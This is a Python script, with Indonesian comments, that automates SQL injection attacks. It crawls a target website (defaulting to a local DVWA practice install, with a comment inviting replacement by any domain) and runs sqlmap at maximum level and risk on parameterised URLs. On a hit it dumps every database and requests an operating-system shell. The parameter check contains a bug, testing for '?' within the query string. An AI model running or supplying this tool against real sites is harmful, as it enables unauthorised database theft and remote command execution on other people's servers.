import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re

# Konfigurasi
TARGET = "http://localhost/dvwa/"  # Ganti dengan domain target Anda
CRAWL_LIMIT = 50  # Batas jumlah halaman yang di-crawl
SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
VISITED = set()
URLS_WITH_PARAMS = []

def crawl(url):
    if len(VISITED) >= CRAWL_LIMIT:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return
    VISITED.add(url)
    print(f"[Crawl] {url}")

    # Cari link
    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        # Batasi hanya di domain target
        if TARGET in link and link not in VISITED:
            if "?" in parsed.query:  # Ada parameter GET
                URLS_WITH_PARAMS.append(link)
            crawl(link)

def test_sqlmap(url):
    print(f"\n[+] Menguji kerentanan SQLi: {url}")
    check_cmd = [
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ]
    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        run_full_sqlmap(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def run_full_sqlmap(url):
    commands = [
        [SQLMAP_PATH, "-u", url, "--batch", "--dbs"],
        [SQLMAP_PATH, "-u", url, "--batch", "--dump-all"],
        [SQLMAP_PATH, "-u", url, "--batch", "--os-shell"]
    ]
    for cmd in commands:
        subprocess.run(cmd)

if __name__ == "__main__":
    print("[*] Mulai crawling...")
    crawl(TARGET)

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")
    for vuln_url in URLS_WITH_PARAMS:
        test_sqlmap(vuln_url)
